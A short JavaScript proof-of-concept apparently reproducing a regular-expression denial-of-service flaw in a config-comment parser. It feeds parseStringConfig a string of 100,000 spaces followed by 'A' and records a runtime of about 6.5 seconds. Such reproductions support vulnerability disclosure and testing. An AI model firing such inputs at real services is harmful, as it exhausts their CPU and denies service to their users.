const ConfigCommentParser = require("./config-comment-parser.js");

//Attack String :""+" "*100000+"A"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "A";

var parser = new ConfigCommentParser();
console.log(parser.parseStringConfig(str, ""));

// real    0m6.466s
// user    0m6.438s
// sys     0m0.010s
